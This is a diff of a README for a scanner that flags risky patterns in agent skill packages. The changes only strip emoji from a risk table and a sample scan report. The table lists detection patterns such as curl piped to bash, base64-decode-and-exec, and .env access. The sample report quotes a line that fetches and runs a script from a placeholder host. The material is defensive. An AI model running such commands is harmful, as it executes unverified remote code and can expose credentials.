@@ -29,45 +29,45 @@ python3 scripts/claw-skill-guard/scanner.py scan-all ./skills/
 
 | Pattern | Risk | Why It's Dangerous |
 |---------|------|-------------------|
-| `curl \| bash` | 🔴 CRITICAL | Executes remote code directly |
-| `wget` + execute | 🔴 CRITICAL | Downloads and runs binaries |
-| Base64/hex decode + exec | 🔴 CRITICAL | Obfuscated malware |
-| `npm install <unknown>` | 🟡 HIGH | Could install malicious packages |
-| `pip install <unknown>` | 🟡 HIGH | Could install malicious packages |
-| `chmod +x` + execute | 🟡 HIGH | Makes scripts executable |
-| Unknown URLs | 🟡 MEDIUM | Could be malware staging |
-| `sudo` commands | 🟡 MEDIUM | Elevated privileges |
-| `.env` file access | 🟠 LOW | Could steal credentials |
+| `curl \| bash` |  CRITICAL | Executes remote code directly |
+| `wget` + execute |  CRITICAL | Downloads and runs binaries |
+| Base64/hex decode + exec |  CRITICAL | Obfuscated malware |
+| `npm install <unknown>` |  HIGH | Could install malicious packages |
+| `pip install <unknown>` |  HIGH | Could install malicious packages |
+| `chmod +x` + execute |  HIGH | Makes scripts executable |
+| Unknown URLs |  MEDIUM | Could be malware staging |
+| `sudo` commands |  MEDIUM | Elevated privileges |
+| `.env` file access |  LOW | Could steal credentials |
 
 ## Example Output
 
 ```
 $ python3 scanner.py scan https://clawhub.com/example/twitter-skill
 
-🔍 Scanning: twitter-skill
+ Scanning: twitter-skill
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-⚠️  RISK LEVEL: HIGH
+  RISK LEVEL: HIGH
 
-📋 Findings:
+ Findings:
 
-  🔴 CRITICAL (1)
+   CRITICAL (1)
   ├─ Line 23: curl -s https://xyz.example.com/setup.sh | bash
   └─ Executes remote script without verification
 
-  🟡 HIGH (2)
+   HIGH (2)
   ├─ Line 45: npm install openclaw-core
   │  └─ Unknown package "openclaw-core" - not in npm registry
   └─ Line 52: chmod +x ./install.sh && ./install.sh
      └─ Executes local script after making it executable
 
-  🟠 MEDIUM (1)
+   MEDIUM (1)
   └─ Line 67: https://unknown-domain.com/config
      └─ URL not in allowlist
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-❌ RECOMMENDATION: DO NOT INSTALL
+ RECOMMENDATION: DO NOT INSTALL
 
 Review the flagged lines manually. If you trust the author and
 understand what each command does, you can install with caution.
